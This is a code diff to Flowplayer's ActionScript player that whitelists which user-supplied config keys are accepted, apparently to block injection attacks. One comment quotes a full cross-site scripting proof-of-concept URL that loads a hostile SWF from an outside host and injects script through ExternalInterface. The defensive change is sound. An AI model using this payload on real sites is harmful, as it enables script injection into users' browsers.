@@ -627,13 +627,61 @@ package org.flowplayer.view {
 			}
             var configStr:String = Preloader(root).injectedConfig || root.loaderInfo.parameters["config"];
             var configObj:Object = configStr && configStr.indexOf("{") == 0 ? ConfigParser.parse(configStr) : {};
+            var builtInConfig:Object;
+            var newConfigObj:Object = {};
+            if (configObj.hasOwnProperty("clip") && configObj["clip"].hasOwnProperty("provider") && configObj["clip"]["provider"] == "audio") {
+                if (!newConfigObj.hasOwnProperty("clip")) {
+                    newConfigObj["clip"] = {};
+                }
+                newConfigObj["clip"]["provider"] = "audio";
+                // allow clip->url
+                if (configObj.hasOwnProperty("clip") && configObj["clip"].hasOwnProperty("url")) {
+                    newConfigObj["clip"]["url"] = configObj["clip"]["url"];
+                }
+                // allow plugins->audio (poss attack? hard codeable?)
+                // it is basically just url to the audio swf, can we detect where that is?
+                // http://aquaman.wgtn.cat-it.co.nz/build/flowplayer-3.2.18.swf?config={%27log%27%20:%20{%27level%27%20%20:%20%27debug%27},%27clip%27:%20{%27provider%27:%27audio%27},%27plugins%27:{%27audio%27:{%27url%27:%27http://0me.me/demo/xss/flash/normalEmbededXSS.swf?\\\%22%29%29}catch%28e%29{};alert%28/ExternalInterfaceXSSImURL1/%29;//%27}}}}
+                if (configObj.hasOwnProperty("plugins") && configObj["plugins"].hasOwnProperty("audio")) {
+                    if (!newConfigObj.hasOwnProperty("plugins")) {
+                        newConfigObj["plugins"] = {};
+                    }
+                    //newConfigObj["plugins"]["audio"] = configObj["plugins"]["audio"];
+                }
+                if (configObj.hasOwnProperty("controls")) {
+                    // TODO allow controls->/.*Color$/ (need regex)
+                }
+                builtInConfig = BuiltInConfig.audioconfig;
+            } else {
+                // allow clip->url
+                if (configObj.hasOwnProperty("clip") && configObj["clip"].hasOwnProperty("url")) {
+                    if (!newConfigObj.hasOwnProperty("clip")) {
+                        newConfigObj["clip"] = {};
+                    }
+                    newConfigObj["clip"]["url"] = configObj["clip"]["url"];
+                }
+                // allow clip->mvideo (poss attack? hard codeable?)
+                // it is in format {id: id, fileurl: fileurl, width: width, height: height, autosize: autosize, resized: false}
+                // we can check that easily enough, need to check types?, just don't do it if obj or array?
+                if (configObj.hasOwnProperty("clip") && configObj["clip"].hasOwnProperty("mvideo")) {
+                    if (!newConfigObj.hasOwnProperty("clip")) {
+                        newConfigObj["clip"] = {};
+                    }
+                    newConfigObj["clip"]["mvideo"] = configObj["clip"]["mvideo"];
+                }
+                // need playerId
+                newConfigObj["playerId"] = configObj["playerId"];
+                // So config requires a playlist array, which basically has same details as clip, but with defaults
+                builtInConfig = BuiltInConfig.videoconfig;
+            }
+            configObj = newConfigObj;
+//            configObj["log"] = {"level":"info"};
 
             if (! configStr || (configStr && configStr.indexOf("{") == 0 && ! configObj.hasOwnProperty("url"))) {
-                _config = ConfigParser.parseConfig(configObj, BuiltInConfig.config, loaderInfo.url, VersionInfo.controlsVersion, VersionInfo.audioVersion);
+                _config = ConfigParser.parseConfig(configObj, builtInConfig, loaderInfo.url, VersionInfo.controlsVersion, VersionInfo.audioVersion);
                 callAndHandleError(initPhase1, PlayerError.INIT_FAILED);
 
             } else {
-                ConfigParser.loadConfig(configObj.hasOwnProperty("url") ? String(configObj["url"]) : configStr, BuiltInConfig.config, function(config:Config):void {
+                ConfigParser.loadConfig(configObj.hasOwnProperty("url") ? String(configObj["url"]) : configStr, builtInConfig, function(config:Config):void {
                     _config = config;
                     callAndHandleError(initPhase1, PlayerError.INIT_FAILED);
                 }, new ResourceLoaderImpl(null, this), loaderInfo.url, VersionInfo.controlsVersion, VersionInfo.audioVersion);
